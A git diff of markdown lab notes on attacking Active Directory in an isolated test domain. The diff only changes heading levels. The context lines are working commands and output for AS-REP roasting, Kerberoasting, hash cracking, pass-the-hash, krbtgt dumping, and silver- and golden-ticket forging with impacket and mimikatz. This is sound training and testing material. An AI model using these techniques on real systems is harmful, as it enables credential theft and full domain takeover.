@@ -1,8 +1,8 @@
-# Attacking Active Directory
+## Attacking Active Directory
 
 [Active Directory Cheat Sheet](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)
 
-## Lab Environment
+### Lab Environment
 
 |Server|IP Address|OS|Function|
 |---|---|---|---|
@@ -94,11 +94,11 @@ Nmap done: 3 IP addresses (3 hosts up) scanned in 342.02 seconds
 
 </details>
 
-# 1. AS-REP Roasting
+## 1. AS-REP Roasting
 
 AS-REP Roasting is a quick way to scan for entry into the domain when you do not know much about the domain yet
 
-## 1.1. The theory
+### 1.1. The theory
 
 AS-REP Roasting is a technique that allows retrieving password hashes for users that have Kerberos preauthentication disabled
 
@@ -113,7 +113,7 @@ If preauthentication is **disabled**:
 - A user can request authentication data for any user and the DC would return an `AS-REP` message
 - The session key part of the `AS-REP` message is encrypted using the user’s password hash, which can be used to brute-force the user’s password offline
 
-## 1.2. Use kerbrute to find users with preauthentication disabled
+### 1.2. Use kerbrute to find users with preauthentication disabled
 
 [Kerbrute](https://github.com/TarlogicSecurity/kerbrute) is a script from TarlogicSecurity which uses impacket library to perform kerberos bruteforcing
 
@@ -145,7 +145,7 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 [*] No passwords were discovered :'(
 ```
 
-## 1.3. Use GetNPUsers.py to get password hashes
+### 1.3. Use GetNPUsers.py to get password hashes
 
 > [!Tip]
 > 
@@ -165,7 +165,7 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 $krb5asrep$23$mike@LAB.VX:16b0315eceaf3c550a69927d62456d9d$821259e1e9980ad1d2fe42f2278c09ebec3aa95cfb361df26ea424d544a79a0f01ee594a13f486086976f469671319da5b60fd334ce103c87d3ac57082820063bad67799e3670e8774594d7a7138caa8892e0cfaec067c19aaf8b32be13f92d302ba0f3b1875a4b030002e447579d3950a9843012c53687ce1342d1a2da0de3dad94b54f56bcfc7d3e07a09b91d81ca94d80690f9db7e0921c20d223f4b6db66ad94b3aa5a89b392fedd8e69428ea27359f80b7c00df0c8075f7fa1543c9f27956e5d5950e14b4405d7c5aeec255d3df1ecabdc05e5a0a892c00cb2e415e8cf7
 ```
 
-## 1.4. Use hashcat to crack the hashes
+### 1.4. Use hashcat to crack the hashes
 
 ```console
 root@kali:~# hashcat -m 18200 GetNPUsers.out /usr/share/wordlists/rockyou.txt
@@ -182,9 +182,9 @@ Started: Wed Dec  7 07:54:16 2022
 Stopped: Wed Dec  7 07:54:44 2022
 ```
 
-## 1.5. Connect to target
+### 1.5. Connect to target
 
-### 1.5.1. Using evil-winrm
+#### 1.5.1. Using evil-winrm
 
 - WinRM `5985` must be enabled on the target
 - User must be a member of `Remote Management Users` on the target
@@ -203,7 +203,7 @@ root@kali:~# evil-winrm -i 192.168.17.11 -u mike -p P@ssw0rd
 *Evil-WinRM* PS C:\Users\mike\Documents>
 ```
 
-### 1.5.2. Using impacket-psexec
+#### 1.5.2. Using impacket-psexec
 
 The user must be administrator on the target because PsExec uses the `ADMIN$` to run the service manager
 
@@ -222,7 +222,7 @@ Microsoft Windows [Version 10.0.20348.1129]
 (c) 2016 Microsoft Corporation. All rights reserved.
 ```
 
-# 2. Cached Credential Storage and Retrieval
+## 2. Cached Credential Storage and Retrieval
 
 **On Kali:** Prepare web server for `mimikatz` download
 
@@ -402,7 +402,7 @@ SID               : S-1-5-21-1470288461-3401294743-676794760-1104
 
 </details>
 
-# 3. Pass the Hash
+## 3. Pass the Hash
 
 > [!Note]
 > 
@@ -410,7 +410,7 @@ SID               : S-1-5-21-1470288461-3401294743-676794760-1104
 > 
 > Use either `00000000000000000000000000000000` (32 zeros) or `aad3b435b51404eeaad3b435b51404ee` (LM hash of `NULL`) to fill the LM hash portion for `impacket-psexec` or `pth-winexe`
 
-# 3.1. Using evil-winrm
+### 3.1. Using evil-winrm
 
 - WinRM `5985` must be enabled on the target
 - User must be a member of `Remote Management Users` on the target
@@ -429,7 +429,7 @@ root@kali:~# evil-winrm -i 192.168.17.11 -u domainadmin -H e19ccf75ee54e06b06a59
 *Evil-WinRM* PS C:\Users\domainadmin\Documents>
 ```
 
-## 3.2. Using impacket-psexec
+### 3.2. Using impacket-psexec
 
 ```console
 root@kali:~# impacket-psexec -hashes 00000000000000000000000000000000:e19ccf75ee54e06b06a5907af13cef42 lab.vx/domainadmin@192.168.17.12 cmd
@@ -451,7 +451,7 @@ Microsoft Windows [Version 10.0.20348.1129]
 
 - **Requires SMB1** to be enabled on target, otherwise `ERROR: Failed to open connection - NT_STATUS_CONNECTION_RESET`
 
-### 3.3.1. Domain account
+#### 3.3.1. Domain account
 
 ```console
 root@kali:~# pth-winexe -U LAB/domainadmin%00000000000000000000000000000000:e19ccf75ee54e06b06a5907af13cef42 //192.168.17.12 cmd
@@ -469,7 +469,7 @@ hostname
 SVR
 ```
 
-### 3.3.2. Local account
+#### 3.3.2. Local account
 
 ```console
 root@kali:~# pth-winexe -U administrator%00000000000000000000000000000000:e19ccf75ee54e06b06a5907af13cef42 //192.168.17.12 cmd
@@ -490,9 +490,9 @@ SVR
 </details>
 
 <details>
-  <summary><h2>3.4. Using mimikatz - sekurlsa::pth + PsExec</h2></summary>
+  <summary><h3>3.4. Using mimikatz - sekurlsa::pth + PsExec</h3></summary>
 
-### 3.4.1. Domain account
+#### 3.4.1. Domain account
 
 - On mimikatz: run `privilege::debug` followed by `sekurlsa::pth`
 - The `sekurlsa::pth` will spawn a new cmd window
@@ -536,7 +536,7 @@ C:\Windows\system32>hostname
 DC
 ```
 
-### 3.4.2. Local account
+#### 3.4.2. Local account
 
 - Using `sekurlsa::pth` for local accounts is similar as domain accounts; just use `*` or `workgroup` for the `/domain` option
 
@@ -582,9 +582,9 @@ SVR
 
 </details>
 
-# 4. Service Account Attack
+## 4. Service Account Attack
 
-## 4.1. Discover SPNs
+### 4.1. Discover SPNs
 
 ```cmd
 C:\Users\mike>setspn -Q */*
@@ -597,11 +597,11 @@ CN=MSSQL Service Account,OU=OSCP Lab,DC=lab,DC=vx
 ⋮
 ```
 
-## 4.2. Kerberoasting
+### 4.2. Kerberoasting
 
-### 4.2.1. Extract service ticket hashes
+#### 4.2.1. Extract service ticket hashes
 
-#### Option 1: Extract on Windows target using Invoke-Kerberoast script from powershell-empire
+##### Option 1: Extract on Windows target using Invoke-Kerberoast script from powershell-empire
 
 **On Kali**: Prepare web server for `Invoke-Kerberoast.ps1` download
 
@@ -626,7 +626,7 @@ Upload the hash to Kali (Apache2 is already running with uploads folder and `upl
 
 Move hash file to working folder: `mv /var/www/html/uploads/tgs.hash .`
 
-#### Option 2: Extract from Kali Linux using GetUserSPNs using Impacket
+##### Option 2: Extract from Kali Linux using GetUserSPNs using Impacket
 
 > [!Tip]
 >
@@ -643,7 +643,7 @@ MSSQLSvc/SVR.lab.vx:1433  MSSQLSVC            2022-10-24 12:52:02.806113  2022-1
 MSSQLSvc/SVR.lab.vx       MSSQLSVC            2022-10-24 12:52:02.806113  2022-11-02 08:14:41.802510
 ```
 
-### 4.2.2. Cracking service account hash using hashcat
+#### 4.2.2. Cracking service account hash using hashcat
 
 ```console
 root@kali:~# hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt
@@ -654,9 +654,9 @@ $krb5tgs$23$*MSSQLSVC$LAB.VX$lab.vx/MSSQLSVC*•••hash-truncated•••:P@
 $krb5tgs$23$*ADFSSVC$LAB.VX$lab.vx/ADFSSVC*•••hash-truncated•••:P@ssw0rd
 ```
 
-## 4.3. Silver Ticket
+### 4.3. Silver Ticket
 
-### 4.3.1. Retrieve domain's numeric identifier
+#### 4.3.1. Retrieve domain's numeric identifier
 
 Security Identifier or SID format: `S-R-I-S`
 - `S` - A literal `S` to identify the string as a SID
@@ -677,7 +677,7 @@ User Name SID
 lab\mike  S-1-5-21-1470288461-3401294743-676794760-1105
 ```
 
-### 4.3.2. Generate hash value for service account password
+#### 4.3.2. Generate hash value for service account password
 
 ```cmd
 mimikatz # kerberos::hash /password:P@ssw0rd
@@ -687,7 +687,7 @@ mimikatz # kerberos::hash /password:P@ssw0rd
         * des_cbc_md5       76fdfece25e3da54
 ```
 
-### 4.3.3. Purge existing kerberos tickets
+#### 4.3.3. Purge existing kerberos tickets
 
 > [!Important]
 >
@@ -698,7 +698,7 @@ mimikatz # kerberos::purge
 Ticket(s) purge for current session is OK
 ```
 
-### 4.3.4. Generate KRB_TGS ticket
+#### 4.3.4. Generate KRB_TGS ticket
 
 > [!Tip]
 >
@@ -726,7 +726,7 @@ Lifetime  : 18/4/2022 9:15:16 am ; 15/4/2032 9:15:16 am ; 15/4/2032 9:15:16 am
 Golden ticket for 'nonexistentuser @ LAB.VX' successfully submitted for current session
 ```
 
-### 4.3.5. Verify ticket
+#### 4.3.5. Verify ticket
 
 ```cmd
 C:\Users\dummy>klist
@@ -747,7 +747,7 @@ Cached Tickets: (1)
         Kdc Called:
 ```
 
-### 4.3.6. Attempt login to service
+#### 4.3.6. Attempt login to service
 
 ```cmd
 C:\Users\dummy>"C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\SQLCMD.EXE" -S svr.lab.vx
@@ -760,9 +760,9 @@ LAB\nonexistentuser
 (1 rows affected)
 ```
 
-# 5. Golden Ticket
+## 5. Golden Ticket
 
-## 5.1. Using impacket
+### 5.1. Using impacket
 
 If you already have password or hash of domain admin user, the attack can be performed from Kali via impacket
 
@@ -770,7 +770,7 @@ If you already have password or hash of domain admin user, the attack can be per
 >
 > All Impacket scripts can be called in Kali with `impacket-<script name>`, there's no need to do `python3 /usr/share/doc/python3-impacket/examples/<script name>.py`
 
-### 5.1.1. Retrieve krbtgt password hash
+#### 5.1.1. Retrieve krbtgt password hash
 
 ```console
 root@kali:~# impacket-secretsdump -hashes 00000000000000000000000000000000:e19ccf75ee54e06b06a5907af13cef42 lab.vx/domainadmin@192.168.17.11
@@ -782,7 +782,7 @@ krbtgt:502:aad3b435b51404eeaad3b435b51404ee:09320ee4ca4f627b183bba1335d1c0c7:::
 ⋮
 ```
 
-### 5.1.2. Uplookup domain SID
+#### 5.1.2. Uplookup domain SID
 
 ```console
 root@kali:~# impacket-lookupsid -hashes 00000000000000000000000000000000:e19ccf75ee54e06b06a5907af13cef42 lab.vx/domainadmin@192.168.17.11
@@ -791,7 +791,7 @@ root@kali:~# impacket-lookupsid -hashes 00000000000000000000000000000000:e19ccf7
 ⋮
 ```
 
-### 5.1.3. Create golden ticket
+#### 5.1.3. Create golden ticket
 
 ```console
 root@kali:~# impacket-ticketer -nthash 09320ee4ca4f627b183bba1335d1c0c7 -domain-sid S-1-5-21-2009310445-1600641453-2559099802 -domain lab.vx administrator
@@ -811,7 +811,7 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 [*] Saving ticket in administrator.ccache
 ```
 
-### 5.1.4. Use the golden ticket to connect to **any** domain machine
+#### 5.1.4. Use the golden ticket to connect to **any** domain machine
 
 The `-k` option of `impacket-psexec` means use Kerberos authentication; it grabs credentials from ccache file specified in `$KRB5CCNAME` environment variable
 
@@ -835,9 +835,9 @@ C:\Windows\system32> whoami
 nt authority\system
 ```
 
-## 5.2. Using mimikatz
+### 5.2. Using mimikatz
 
-### 5.2.1. Retrieve krbtgt password hash
+#### 5.2.1. Retrieve krbtgt password hash
 
 ```cmd
 mimikatz # privilege::debug
@@ -853,7 +853,7 @@ NTLM : 3ac4cccaca955597db0d11a7ffa50025
 ⋮
 ```
 
-### 5.2.2. Create golden ticket
+#### 5.2.2. Create golden ticket
 
 - This can be performed on any domain member machine, without administrator rights
 - The `misc::cmd` command opens a command prompt session with the golden ticket injected to that session
@@ -888,7 +888,7 @@ mimikatz # misc::cmd
 Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 00007FF6FF396438
 ```
 
-### 5.2.3. Use the golden ticket to connect to **any** domain machine
+#### 5.2.3. Use the golden ticket to connect to **any** domain machine
 
 - Verify golden ticket in session
 
@@ -963,7 +963,7 @@ Tunnel adapter isatap.{122DB809-79C7-4A57-9A51-76A6C8B0B97B}:
    Connection-specific DNS Suffix  . :
 ```
 
-## 5.3. Golden Ticket Fixed?
+### 5.3. Golden Ticket Fixed?
 
 Access denied and TGT revoked errors were seen when performing golden ticket attacks on newer updated Windows boxes
 
